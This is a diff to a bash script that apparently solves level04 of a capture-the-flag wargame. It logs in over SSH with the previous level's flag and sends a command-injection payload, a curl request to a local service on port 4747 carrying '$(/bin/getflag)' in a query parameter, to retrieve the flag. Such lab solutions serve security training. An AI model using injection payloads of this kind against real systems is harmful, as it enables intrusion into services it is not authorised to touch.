@@ -108,11 +108,9 @@ main() {
     level04_username="level04";
     level04_password=$(cat "$CURR_DIR_PATH/../../level03/flag");
 
-    trap 'close_ssh_socket "$level04_socket_path" "$host" "$port" "$level04_username"' EXIT;
     init_ssh_socket "$level04_socket_path" "$host" "$port" "$level04_username" "$level04_password";
     checkflag=$(ssh_exec_via_socket "$level04_socket_path" "$host" "$port" "$level04_username" "curl -s 'localhost:4747/?x=\$(/bin/getflag)'" | head -n 1 | awk '{ print $NF }');
     close_ssh_socket "$level04_socket_path" "$host" "$port" "$level04_username";
-
 
     flag_outpath="$CURR_DIR_PATH/../flag";
     echo "Checkflag: $checkflag";
